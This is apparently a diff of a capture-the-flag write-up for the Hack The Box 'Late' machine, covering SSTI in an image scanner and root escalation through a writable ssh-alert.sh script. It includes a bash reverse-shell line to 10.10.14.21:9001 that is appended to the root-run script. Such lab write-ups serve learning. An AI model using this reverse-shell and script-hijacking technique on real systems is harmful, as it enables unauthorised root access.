@@ -39,8 +39,6 @@ Moving to images.late.htb, there is an image scanner which reads text inside the
 
 It is vulnerable to SSTI template injection.
 
-
-
 Create image containing an SSTI payload in text format.
 
 <img src="../htb_assets/images/late/2022-08-02-02-20-37-image.png"/>
@@ -50,8 +48,6 @@ Upload and scan this image in the website.
 This payload will be executed in the server and it output backs the result of "id" command which is executed.
 
 <img src="../htb_assets/images/late/2022-08-02-02-23-30-image.png"/>
-
-
 
 To make it simple, create an index.html file and add bash reverse shell one liner to it.
 
@@ -75,7 +71,6 @@ uid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc)
 svc_acc@late:~/app$ whoami
 whoami
 svc_acc
-
 ```
 
 Stabilise the shell using python.
@@ -85,8 +80,6 @@ Stabilise the shell using python.
 An unusual script (ssh-alert.sh) is on /usr/bin/sbin/ directory. What this script does is, it sends a mail to the user who login using ssh. So this script executes with root privileges when a user login using ssh into the machine. 
 
 <img src="../htb_assets/images/late/2022-08-02-03-39-39-image.png"/>
-
-
 
 While checking the attribute of the script, user can append to this script.
 
@@ -100,13 +93,9 @@ echo "bash -i >& /dev/tcp/10.10.14.21/9001 0>&1" >> ssh-alert.sh
 
 This command to gain root shell will be appended to the script and whenever a user logs in through ssh, the listner will receive a shell with root privileges.
 
-
-
 To perform this, copy contents of ssh private key of user svc_acc and set permissions to 600. Turn on netcat listener on port 9001. Login using id_rsa key which is created.
 
 <img src="../htb_assets/images/late/2022-08-02-03-41-12-image.png"/>
-
-
 
 <img src="../htb_assets/images/late/2022-08-02-03-41-52-image.png"/>
 
